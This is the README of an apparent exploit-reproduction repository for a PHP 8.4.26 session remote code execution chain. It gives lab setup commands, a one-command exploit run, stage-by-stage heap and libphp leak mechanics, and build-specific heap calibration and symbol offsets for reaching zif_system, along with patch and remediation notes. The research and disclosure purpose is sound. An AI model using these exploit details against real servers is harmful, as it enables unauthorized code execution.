# php2shell — PHP 8.4.26 Session Vulnerability Reproduction

This repository contains a calibrated exploit chain for PHP 8.4.26 + Apache prefork + mod_php. The attack requests use HTTP, the target page does not need `session_start()`, and the chain does not require deploying a PHP payload to the target. The repository reports 3/3 successful runs on the official `php:8.4.26-apache` image (`PROOF: uid=33(www-data)...`). These are recorded reproduction results, not a guarantee for other builds or configurations.

The current driver requires `display_errors=1`. Separate research artifacts show a heap leak with `display_errors=0`; they do not establish a complete RCE chain in that configuration. The default local demo also uses Docker access to obtain symbol offsets and a bind-mounted file to retrieve proof, as described below.

## CVE scope and patch status

PHP's advisories distinguish [CVE-2026-109618: RCE via OOM corruption](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) from [CVE-2026-109619: RCE via stale global state](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp). The cross-request session state consumed by this driver matches the latter mechanism. OOM supplies the interruption; its presence alone does not establish a separate exploit of CVE-2026-109618.

The [Wiz research article](https://www.wiz.io/blog/php2shell-php-rce) groups upload-progress unserializer and session-ID disclosure variants under CVE-2026-109618. That grouping differs from PHP's lifecycle description, so identify the concrete mechanism when comparing reports. This driver's final stage uses stale `PS(http_session_vars)`, while the separate `BG(unserialize)` research in [NOTES_BG.md](NOTES_BG.md) follows a different execution path.

PHP released fixes in **8.2.35, 8.3.36, 8.4.27 and 8.5.12** on 21 October 2026. See the [official release advisory](https://www.php.net/archive/2026.php#2026-10-21-5) and [upstream fix](https://github.com/php/php-src/commit/506e87fa7dcdd306975e5b8f8265ee03527aacbf). This repository's reproduction results concern the vulnerable versions; no before/after execution against the patched release was performed during the documentation review.

## Run

Copy and run the complete command sequence below. This repository does not compile PHP or Apache and has no `docker build`; the environment uses the official `php:8.4.26-apache` image with configuration mounts from `docker/`.

~~~bash
# Requirements: Docker Engine/Desktop, Docker Compose v2, and Python 3.9+
git clone https://github.com/TTN-ATTN/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Pull the official image (PHP 8.4.26 / Debian 12 / Apache prefork)
docker compose -f docker/docker-compose.yml pull

# 2) Start the target: one worker, display_errors=On, memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) Wait for Apache and confirm the ordinary page is available
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) Run the complete exploit with one command; the first run reads libphp offsets automatically
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

If you are already in the repository directory, skip `git clone` and `cd`. You can also skip `pull`; `up -d` pulls the image automatically.

`exploit.py` handles worker rotation, both leak stages, `zif_system` execution, and proof retrieval. Each stage has built-in retries. Rotation deliberately crashes an Apache child; worker exits are part of the recorded chain. The reported reproduction environment is:

| Component | Version | Source |
|---|---|---|
| PHP | 8.4.26 (NTS, mod_php) | `php:8.4.26-apache` |
| Base system | Debian 12 (bookworm) | Same image |
| Apache | 2.4.69 (Debian 12 package in the official image; tested) | Same image |
| MPM | prefork, one worker | [docker/apache.conf](docker/apache.conf) |
| Apache in lab reports | 2.4.68 (original lab build, `--profile lab`) | For an exact match, use the 2.4.68 tag from [apache/httpd](https://github.com/apache/httpd) |

Official image repository: [docker-library/php](https://github.com/docker-library/php) (Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)); PHP source: [php/php-src](https://github.com/php/php-src) (tag `php-8.4.26`).

When the target is localhost and no offsets have been loaded, the driver invokes [docker/offsets.py](docker/offsets.py) unless automatic lookup is disabled. The helper uses `docker cp` to obtain the container's `libphp.so`, reads its `zif_system` and `zval_ptr_dtor` symbol offsets, and writes `out/offsets.env`. Existing offsets are reused, so they must be checked after changing the image. This lookup does not calibrate heap layout, filler counts or carrier placement; those remain specific to the selected profile.

Remote URLs do not trigger Docker lookup. Without an offsets file or explicit symbol offsets, the driver falls back to the **lab symbol offsets**, even when the selected profile is `bookworm`. Selecting a profile therefore does not establish compatibility with an arbitrary remote build.

The default command is `id>/out/p1` (10 bytes). The container's `/out` is mounted to the repository's `./out`, so the driver reads proof from a local file:

~~~text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Commands in the payload are limited to **14 bytes**. In the local demo, the writable bind mount allows a longer script to be prepared on the host and invoked with `sh</out/c` (8 bytes). This example assumes access to that shared directory:

~~~bash
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
~~~

Common options include `--profile`, `--cmd`, `--proof-file`, `--fetch`, `--zif-offset`, `--dtor-offset`, `--htdata-offset`, `--no-pre-rotate`, and `--retries`. The default profile is `bookworm` (official image); use `--profile lab` for the original lab build. Set `--offsets-file ''` to disable automatic offset lookup. If the container name is not `php2shell-target`, specify it with `--docker-container`.

The bookworm heap calibration is built in: stage 1 uses **841** fillers; stage 2 uses target array **406** with 16-byte element values; stage 3 uses `HTDATA=chunk+0x690d8`, A's padding is 6×(31,31), and A also includes a valid 32-character `Cookie: PHPSESSID` so B reuses the stale id (`send_cookie=0`) and avoids the session `Set-Cookie` header overwriting `val.type` at `R0+16`. B uses a 15-byte carrier to overwrite the reference's `val.value`. The recorded official-image symbol offsets are `zif_system=0x465370` and `zval_ptr_dtor=0x65eb60`; the original lab uses `0x43a870` and `0x613c50`. These values are build-specific.

## Mechanism overview

The vulnerable path is session initialization triggered by `session.upload_progress` before RINIT, combined with dangling pointers left across requests after an OOM bailout. The example below uses the lab build; bookworm calibration values for the official image are listed above.

All attack traffic consists of ordinary multipart HTTP requests, and the target page contains only `<?php echo "OK\n"; ?>`:

0. **Worker rotation:** After `A_bigfields` (3 MB of live POST fields plus a 12 MB OOM), send a B request that initializes a session. In the recorded lab runs, the child exited with SIGABRT and prefork forked a new worker with the same useful libphp and chunk mappings.
1. **Heap leak:** A uses 1001 fields to trigger a `max_input_vars` warning (`display_errors=On` → `headers_sent=1`), and `PHPSESSID=\x00` causes a new id to be created with `send_cookie=1`. Cookie sending fails because headers have already been sent, so initialization returns before `php_session_track_init()`. The final 12 MB field then causes OOM during multipart parsing, leaving stale `PS(id)` and `send_cookie` state. B reclaims the ID allocation and forges its string length through a 79-byte carrier. `php_url_encode()` reads beyond the original string into heap data and places it in `Set-Cookie`. The saved lab response contains 4096 decoded bytes and 98 candidate heap pointers. This stage does not use a fake session reference or fake HashTable.
2. **libphp leak:** A places dangling `PS(id)` at `chunk+0xb7400`. B's 56-byte HashTable page makes `ZSTR_LEN(PS(id))` read `nTableSize=16`; its data area contains `nNextFreeElement|pDestructor`. Since `pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`, the libphp base can be recovered from `Set-Cookie`.
3. **Command execution:** A uses six pads to place the dangling reference at `R0=chunk+0x24e0`. B uses a 55-byte raw buffer to overwrite `R0-0x10`; the fake HashTable is stored in a live 167-byte string at `chunk+0x6e0d8`, with `pDestructor = zif_system = libphp+0x43a870`. The call chain is:

   ~~~text
   php_session_track_init()
     zval_ptr_dtor(PS(http_session_vars))
       zend_reference_destroy(R0)
         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
           zend_array_destroy(fake HT)
             zend_hash_destroy(fake HT)
               pDestructor(&bucket->val)   # zif_system
   ~~~

   The final stage calls `zif_system` inside libphp and does not need libc.

## Mechanism details

- **Why the page does not need `session_start()`:** A and B initialize the session in multipart callbacks before RINIT (`FILE_START → php_session_rfc1867_update → php_session_initialize()`; `END → php_session_rfc1867_cleanup → php_session_initialize()`). This does not depend on the script contents.
- **Why the pointers become dangling:** Multipart processing runs before normal module RINIT. If startup bails out after publishing session state, module cleanup can be skipped while request memory is released. A later request on the same worker can consume that state before normal initialization resets it. The leak stages consume stale `PS(id)`; the execution stage reaches `zval_ptr_dtor` through stale `PS(http_session_vars)`.
- **Why allocations can be reclaimed:** B's multipart parsing reuses memory released with A's request. The leak stage forges a string length, while the execution stage uses profile-specific reference carriers and a live 167-byte string containing the fake HashTable and call data.
- **Why it works with ASLR in the recorded environment:** Two `Set-Cookie` reads reveal the chunk base and libphp base. HTTP-triggered abort/fork rotation was observed to preserve useful mappings under the lab's prefork master. The driver relies on that behavior and calibrated relative offsets; it does not establish the same behavior for other worker models or after a master restart. The final stage does not need a libc address leak.
- **Earlier approach:** Defect D, using `session_unset()` and a userland `__destruct` to trigger an `arData` UAF, achieved RCE on a custom PHP page ([NOASLR_REPORT.md](NOASLR_REPORT.md)). It violates the no-target-specific-PHP constraint and is included only as mechanism background.

Addresses and offsets relative to the chunk or libphp base (independent of ASLR):

| Location | Meaning |
|---|---|
| `chunk+0xb7400` | Stage 2 dangling `PS(id)` |
| `chunk+0xb73f0` | Stage 2 target HashTable (`a0443`) |
| `chunk+0x6e0d8` | Stage 3 fake HashTable string data |
| `chunk+0x24e0` | Stage 3 dangling reference `R0` |
| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
| `libphp+0x43a870` | `zif_system` |

The table above describes the lab build (`--profile lab`). For the official image (default `--profile bookworm`), calibration is: 841 stage 1 fillers; stage 2 target array 406 with 16-byte element values; stage 3 `HTDATA=chunk+0x690d8`, A padding 6×(31,31) plus a valid 32-character `Cookie: PHPSESSID`, and a 15-byte carrier in B. The recorded symbol offsets for that image are `0x465370` / `0x65eb60`; automatic lookup is subject to the localhost and cache conditions described above.

For the detailed mechanism, GDB evidence, and request calibration, see [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md) (heap leak), [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (libphp leak and full chain), [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) (leak without `display_errors`), and [NOTES.md](NOTES.md) (root cause and source locations).

## Reproduction notes

- **Driver scope:** `python3 exploit.py -u ...` handles worker rotation, both leaks and the execution stage. It needs no application-specific PHP gadget or local signal to rotate workers. The local demo's offset preparation and proof retrieval use Docker and the bind mount.
- **Proof limits:** The driver accepts a nonempty local proof file or a nonempty HTTP 200 body from `--fetch`. These checks do not authenticate a marker unique to the current run; a fetched file may already exist. Missing proof also does not establish that the command never ran.
- **Recorded results:** README records 3/3 runs for the official image and `bookworm` profile. [The lab log](logs/pure_http_aslr_20261021.txt) separately records 5/5 without initial rotation and 9/10 with initial rotation for the original lab build. These are different experiments and should not be combined into one success rate.
- **Artifact review:** Offline decoding confirmed 4096 bytes and 98 candidate pointers in [the heap-leak response](logs/http_heap_leak_20261021.resp), and a 16-byte cookie containing the recorded destructor pointer in [the libphp-leak response](logs/libphp_leak_20261021.resp). This checks saved artifacts, not a fresh execution of the chain. Earlier `session_unset()` traces and the separate decoder experiments do not independently prove the current driver's RCE stage.
- **Requirements of this driver:** `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, `session.use_cookies=1`, `session.use_strict_mode=0`, upload progress enabled, and a single-worker prefork setup, with the supplied build calibration. These are reproduction conditions, not universal prerequisites for either CVE. Failure on FPM, multiple workers or another memory limit does not establish safety.
- **Separate research:** [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) documents heap disclosure with display errors disabled. [NOTES_BG.md](NOTES_BG.md) and the older no-ASLR reports describe other research paths with their own prerequisites and incomplete steps.
- **Remediation:** Update to a vendor-fixed PHP release. Disabling upload progress reduces the confirmed session paths but is not a complete mitigation for the wider vulnerabilities; see the official advisory above.
- For vulnerability research and reproduction in authorized environments only.
